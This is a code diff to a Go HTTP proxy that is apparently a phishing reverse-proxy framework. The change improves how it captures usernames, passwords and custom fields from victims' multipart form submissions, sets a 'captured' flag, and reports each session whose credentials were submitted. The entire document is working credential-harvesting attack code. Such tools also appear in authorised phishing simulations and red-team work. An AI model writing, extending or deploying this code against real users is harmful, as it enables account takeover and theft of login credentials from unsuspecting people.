@@ -762,6 +762,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						} else if multipart_re.MatchString(contentType) {
 							if req.ParseMultipartForm(32 << 20) == nil && req.MultipartForm != nil && len(req.MultipartForm.Value) > 0 {
 								log.Debug("POST: %s", req.URL.Path)
+								captured := false
 
 								for k, v := range req.MultipartForm.Value {
 									// patch phishing URLs in POST params with original domains
@@ -775,6 +776,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 												if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
 													log.Error("database: %v", err)
 												}
+												captured = true
 											}
 										}
 									}
@@ -787,6 +789,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 												if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
 													log.Error("database: %v", err)
 												}
+												captured = true
 											}
 										}
 									}
@@ -800,11 +803,17 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 													if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
 														log.Error("database: %v", err)
 													}
+													captured = true
 												}
 											}
 										}
 									}
 								}
+
+								if captured {
+									p.ReportCredentialsSubmitted(ps.SessionId)
+								}
+
 								for k, v := range req.MultipartForm.Value {
 									req.MultipartForm.Value[k][0] = string(p.patchUrls(pl, []byte(v[0]), CONVERT_TO_ORIGINAL_URLS))
 								}
@@ -921,8 +930,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 												if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
 													log.Error("database: %v", err)
 												}
+												captured = true
 											}
-											captured = true
 										}
 									}
 									if pl.password.tp == "post" {
@@ -934,8 +943,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 												if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
 													log.Error("database: %v", err)
 												}
+												captured = true
 											}
-											captured = true
 										}
 									}
 									for _, cp := range pl.custom {
@@ -948,8 +957,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 													if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
 														log.Error("database: %v", err)
 													}
+													captured = true
 												}
-												captured = true
 											}
 										}
 									}
